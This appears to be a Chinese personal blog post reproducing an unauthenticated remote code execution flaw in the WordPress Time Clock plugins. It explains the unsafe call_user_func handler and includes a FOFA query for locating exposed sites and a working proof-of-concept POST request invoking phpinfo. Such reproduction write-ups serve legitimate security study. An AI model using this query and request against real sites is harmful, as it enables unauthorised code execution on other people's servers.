<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8" />
  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
  <title>
    
    wp_timeclock_rce 丨
    

    Le0
  </title>

  
  <link rel="shortcut icon" href="/icon.svg">
  

  <link rel="preconnect" href="https://cdnjs.cloudflare.com">
  
  <link id="theme" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-light.css">
  <script src="https://unpkg.com/@highlightjs/cdn-assets@11.9.0/highlight.min.js"></script>
  

  <!-- 字体 -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">

  
<link rel="stylesheet" href="/css/root.css">

  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/post.css">

<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <header class="header">
  <section class="header-container">
    <a class="logo" href="/">Le0的随便写写</a>
    <ul class="nav">
      
      <li><a href="/archives">archives</a></li>
      
    </ul>
  </section>
</header>
  <main class="main">
    <article class="post">
  
  <div class="post-title">wp_timeclock_rce</div>
  <div class="post-meta">
    <div class="date">2024 November 20th</div>
    <div class="tags">
      
      <div class="tag-item">漏洞复现</div>
      
    </div>
  </div>
  

  <main class="post-content"><h4 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h4><p>WordPress 的 Time Clock 插件和 Time Clock Pro 插件在 1.2.2 及以下版本（适用于 Time Clock）和 1.1.4 版本（适用于 Time Clock Pro）中存在通过“etimeclockwp_load_function_callback”函数执行远程代码的漏洞。这允许未经身份验证的攻击者在服务器上执行代码。无法指定调用函数的参数。</p>
<p>1.2.2版本 链接： <a target="_blank" rel="noopener" href="https://downloads.wordpress.org/plugin/time-clock.1.2.2.zip">https://downloads.wordpress.org/plugin/time-clock.1.2.2.zip</a></p>
<h4 id="利用细节"><a href="#利用细节" class="headerlink" title="利用细节"></a>利用细节</h4><p>fofa-query:</p>
<pre><code class="highlight plain">body=&quot;/wp-content/plugins/time-clock/&quot; || body=&quot;/wp-content/plugins/time-clock-pro/&quot;</code></pre>

<p>includes&#x2F;admin&#x2F;ajax_functions_admin.php</p>
<p><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;</code>该函数的主要目的是接收一个名为 <code>&lt;/font&gt;&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;function&lt;/font&gt;``&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;</code>的 POST 参数，对其进行清理后，检查是否存在对应的函数，如果存在则调用该函数并输出其结果，最后调用 <code>&lt;/font&gt;&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;wp_die()&lt;/font&gt;``&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;</code>终止执行。<code>&lt;/font&gt;</code></p>
<p><code>call_user_func&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;</code>是一个 PHP 内置函数，用于动态地调用一个函数。<code>&lt;/font&gt;</code></p>
<p>安全风险：</p>
<ul>
<li>直接从用户输入（POST 参数）中获取函数名并调用可能存在安全风险。恶意用户可能尝试传入恶意的函数名来执行未经授权的操作或导致安全漏洞。应该对用户输入进行更严格的验证和过滤，以确保只允许特定的、安全的函数被调用。</li>
</ul>
<p><img src="/images/wp-timeclock-rce/wp1.png" alt="代码"></p>
<pre><code class="highlight plaintext">POST /wp-admin/admin-ajax.php?action=etimeclockwp_load_function HTTP/2
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3
Content-Type: application/x-www-form-urlencoded
Content-Length: 16

function=phpinfo
</code></pre>

<p><img src="/images/wp-timeclock-rce/wp2.png" alt="执行效果"></p>
</main>

</article>


<script src="/js/highlight.js"></script>

  </main>
  <footer class="footer">
  
  <span>Copyright © 2024 Le0</span>
  
</footer>
  
<script src="/js/theme.js"></script>

</body>

</html>